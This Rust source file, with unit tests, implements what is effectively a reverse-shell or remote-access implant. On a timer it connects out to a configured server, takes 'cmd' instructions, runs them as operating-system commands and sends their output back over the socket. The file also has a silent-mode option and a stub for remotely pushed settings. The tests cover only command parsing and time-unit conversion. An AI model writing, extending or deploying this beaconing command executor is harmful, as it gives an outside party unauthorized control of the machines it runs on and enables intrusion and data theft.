use std::io::Write;
use std::net::TcpStream;
use std::process::Command;
use std::{io, thread, time};

pub fn run(config: Config)  {
    loop {
        thread::sleep(config.request_period.to_duration());
        let full_address = config.server.full_address();

        println!("Connecting to server at {}", &full_address);
        let stream = TcpStream::connect(&full_address);

        match stream {
            Ok(stream) => {
                println!("Connected to server at {}", full_address);
                let _ = handle_stream(stream);
            }
            Err(_) => {
                println!("Failed to connect to server at {}", full_address);
                continue;
            }
        }
    }
}

fn handle_stream(mut stream: TcpStream) -> Result<(), io::Error> {
    let instruction = parse_stream(&stream);

    match instruction.execute() {
        Ok(output) => {
            output.send_feedback(&mut stream)?;
        }
        Err(_err) => {
            //Error while executing instruction
        }
    }
    Ok(())
}

fn parse_stream(stream: &TcpStream) -> Box<dyn Executable> {
    let mut buffer = [0; 1024];
    stream
        .peek(&mut buffer)
        .expect("Failed to read from stream");

    let input = String::from_utf8_lossy(&buffer[..]);
    let input = input.trim_matches(char::from(0));
    println!("Received command: {}", input);

    instruction_factory(input)
}

struct InstructionOutput {
    output: String,
}
impl InstructionOutput {
    fn send_feedback(&self, stream: &mut TcpStream) -> Result<(), io::Error> {
        stream.write(&self.output.as_bytes())?;
        Ok(())
    }
}
trait Executable {
    fn execute(&self) -> Result<InstructionOutput, io::Error>;
}

struct ReceivedCommand {
    command: String,
}

impl ReceivedCommand {
    fn from_string(command: String) -> Self {
        ReceivedCommand { command }
    }
    fn parse(&self) -> Command {
        let mut cmd;
        let mut parts = self.command.split_whitespace();

        match parts.next() {
            Some(part) => {
                cmd = Command::new(part);
            }
            None => {
                return Command::new("");
            }
        }

        loop {
            match parts.next() {
                Some(part) => {
                    cmd.arg(part);
                }
                None => break,
            }
        }

        cmd
    }
}

impl Executable for ReceivedCommand {
    fn execute(&self) -> Result<InstructionOutput, std::io::Error> {
        let mut command = self.parse();
        let output = &command.output();

        match output {
            Ok(output) => Ok(InstructionOutput {
                output: format!(
                    "\n{}\n{}\n",
                    String::from_utf8_lossy(&output.stdout),
                    String::from_utf8_lossy(&output.stderr)
                ),
            }),
            Err(err) => Ok(InstructionOutput {
                output: format!("{}\n", err),
            }),
        }
    }
}

struct ReceivedSetting {
    key: String,
    value: String,
}

impl ReceivedSetting {
    fn from_string(key: String, value: String) -> Self {
        ReceivedSetting { key, value }
    }
}

impl Executable for ReceivedSetting {
    fn execute(&self) -> Result<InstructionOutput, io::Error> {
        todo!("when settings are available implement thier execution");
    }
}

fn instruction_factory(instruction: &str) -> Box<dyn Executable> {
    let parts: Vec<&str> = instruction.split_whitespace().collect();
    match parts[0] {
        "cmd" => Box::new(ReceivedCommand::from_string(parts[1..].join(" "))),
        "set" => Box::new(ReceivedSetting::from_string(
            parts[1].to_string(),
            parts[2].to_string(),
        )),
        _ => Box::new(ReceivedCommand::from_string("".to_string())),
    }
}

pub enum TimeUnit {
    Milliseconds,
    Seconds,
    Minutes,
    Hours,
    Days,
}

pub struct Period {
    value: u64,
    unit: TimeUnit,
}

impl Period {
    pub fn new(value: u64, unit: TimeUnit) -> Self {
        Period { value, unit }
    }
    fn to_duration(&self) -> time::Duration {
        match self.unit {
            TimeUnit::Milliseconds => time::Duration::from_millis(self.value),
            TimeUnit::Seconds => time::Duration::from_secs(self.value),
            TimeUnit::Minutes => time::Duration::from_secs(self.value * 60),
            TimeUnit::Hours => time::Duration::from_secs(self.value * 60 * 60),
            TimeUnit::Days => time::Duration::from_secs(self.value * 60 * 60 * 24),
        }
    }
}

pub struct ServerInfo {
    address: String,
    port: u16,
}
impl ServerInfo {
    pub fn new(address: &str, port: u16) -> Self {
        ServerInfo { address : address.to_string(), port }
    }

    fn full_address(&self) -> String {
        format!("{}:{}", self.address, self.port)
    }
}

pub struct Config {
    server: ServerInfo,
    request_period: Period,
    silent_mode: bool,
}

impl Config {
    pub fn new(server : ServerInfo, request_period : Period, silent_mode : bool) -> Self {
        Config {
            server,
            request_period,
            silent_mode,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_command_with_just_command() {
        let command = ReceivedCommand::from_string("ls".to_string());
        let result = command.parse();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(result.get_args().count(), 0);
    }

    #[test]
    fn test_parse_command_with_one_arg() {
        let command = ReceivedCommand::from_string("ls -l".to_string());
        let result = command.parse();
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-l"]);
    }

    #[test]
    fn test_parse_command_with_multiple_args_one_dash() {
        let command = ReceivedCommand::from_string("ls -la".to_string());
        let result = command.parse();
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-la"]);
    }

    #[test]
    fn test_parse_command_with_multiple_args_multiple_dashes() {
        let command = ReceivedCommand::from_string("ls -l -a".to_string());
        let result = command.parse();
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-l", "-a"]);
    }

    #[test]
    fn test_parse_command_with_empty_command() {
        let command = ReceivedCommand::from_string("".to_string());
        let result = command.parse();

        assert_eq!(result.get_program(), "");
        assert_eq!(result.get_args().count(), 0);
    }

    #[test]
    fn test_parse_command_with_whitespace_command() {
        let command = ReceivedCommand::from_string( "   ls      -l      -a     ".to_string());
        let result = command.parse();
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-l", "-a"]);
    }

    #[test]
    fn test_period_to_duration_seconds() {
        let period = Period::new(1, TimeUnit::Seconds);
        let duration = period.to_duration();

        assert_eq!(duration.as_secs(), 1);
    }
    #[test]
    fn test_period_to_duration_minutes() {
        let period = Period::new(1, TimeUnit::Minutes);
        let duration = period.to_duration();

        assert_eq!(duration.as_secs(), 60);
    }

    #[test]
    fn test_period_to_duration_hours() {
        let period = Period::new(1, TimeUnit::Hours);
        let duration = period.to_duration();

        assert_eq!(duration.as_secs(), 60 * 60);
    }

    #[test]
    fn test_period_to_duration_days() {
        let period = Period::new(1, TimeUnit::Days);
        let duration = period.to_duration();

        assert_eq!(duration.as_secs(), 60 * 60 * 24);
    }

    #[test]
    fn test_server_info_full_address() {
        let server = ServerInfo::new("127.0.0.1", 8080);
        let full_address = server.full_address();

        assert_eq!(full_address, "127.0.0.1:8080");
    }

}
